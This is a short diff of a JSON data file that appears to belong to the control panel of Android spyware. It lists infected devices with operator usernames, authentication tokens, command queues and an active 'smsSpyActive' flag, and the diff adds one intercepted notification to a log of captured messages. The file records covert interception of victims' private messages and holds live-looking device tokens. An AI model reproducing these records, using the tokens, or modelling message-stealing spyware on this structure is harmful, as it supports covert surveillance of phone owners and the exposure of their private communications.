@@ -4,7 +4,7 @@
     "deviceName": "HP-ABLO-F55F",
     "ownerUsername": "Zarr",
     "token": "7055f57f74cb7eef5034e3301d747b14",
-    "lastSeen": 1777780444473,
+    "lastSeen": 1777780468406,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T05:33:28.300Z",
@@ -2549,6 +2549,14 @@
     "smsSpyActive": true,
     "smsMessages": [
       {
+        "appName": "Messages",
+        "sender": "",
+        "content": "Messages is doing work in the background",
+        "time": "03/05 10:54",
+        "pkg": "com.google.android.apps.messaging",
+        "receivedAt": 1777780470637
+      },
+      {
         "appName": "WA Business",
         "sender": "WhatsApp Business",
         "content": "Memeriksa pesan baru",
@@ -2685,7 +2693,7 @@
     "deviceName": "HP-ABIR123-0330",
     "ownerUsername": "Fibersec",
     "token": "ab095dd2405dc78cf8aaa200b596d4bd",
-    "lastSeen": 1777780444472,
+    "lastSeen": 1777780468630,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T20:52:30.047Z",
